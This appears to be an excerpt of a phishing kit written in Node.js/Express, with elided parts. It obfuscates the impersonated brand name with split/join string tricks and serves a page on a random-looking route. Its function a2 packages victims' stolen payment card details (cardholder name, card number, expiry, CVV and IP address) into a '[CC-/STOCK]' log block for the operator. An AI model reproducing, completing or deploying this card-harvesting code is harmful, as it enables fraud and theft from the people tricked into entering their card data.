...
let target = "V-1I-1N-1C-1I"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "V-1I-1N-1C-1I"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");
...
app.get("/Aw6knaPZ5nz4RnFvFV8s",(req,res)=>{ // done:
    res.render("rowal3",{url:process.env.URL});
});
...
function a2(data,ip) {
    let block="";
    block += `${brand}  | [CC-/STOCK] |  \n`; 
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `Holder NAME: ${data.a0}\nCARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nIP: ${ip}\n`;
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o==#\n`;
    block += `${brand}  | [${target}]  |  `;
